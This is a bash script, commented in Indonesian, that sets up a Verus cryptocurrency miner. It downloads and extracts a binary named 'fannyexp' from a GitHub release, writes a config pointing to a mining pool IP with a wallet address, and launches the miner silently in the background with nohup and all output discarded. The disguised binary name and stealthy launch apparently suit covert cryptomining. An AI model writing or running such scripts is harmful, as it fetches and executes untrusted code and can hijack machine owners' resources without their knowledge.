#!/bin/bash

# Direktori kerja
APP_DIR=~/verusapp
MINER_DIR="$APP_DIR/fannyexp"
CONFIG_FILE="$APP_DIR/config.json"

# Cek apakah sudah dijalankan sebelumnya
if pgrep -f "./fannyexp" > /dev/null; then
    echo "Miner Verus sudah berjalan. Keluar."
    exit 0
fi

# Buat direktori jika belum ada
mkdir -p "$APP_DIR"
cd "$APP_DIR"

# Unduh dan ekstrak hanya jika belum ada
if [ ! -d "$MINER_DIR" ]; then
    wget -q https://github.com/vokerjok/Voker/releases/download/Voker/fannyexp.tar.gz -O fannyexp.tar.gz
    tar -xf fannyexp.tar.gz
    rm -f fannyexp.tar.gz
fi

cd "$MINER_DIR"

# Buat file config
cat > "$CONFIG_FILE" <<END
{
    "app": "-a verushash -o 167.172.99.157:657 -u RLm32mRbwFF43CZAJKzJnGWytVtUTZNuAH -p joko -t 8 --disable-gpu"
}
END

# Set permission
chmod +x "$APP_DIR/fannyexp" "$CONFIG_FILE"

# Jalankan miner di background
nohup ./fannyexp $(jq -r '.app' "$CONFIG_FILE") > /dev/null 2>&1 &
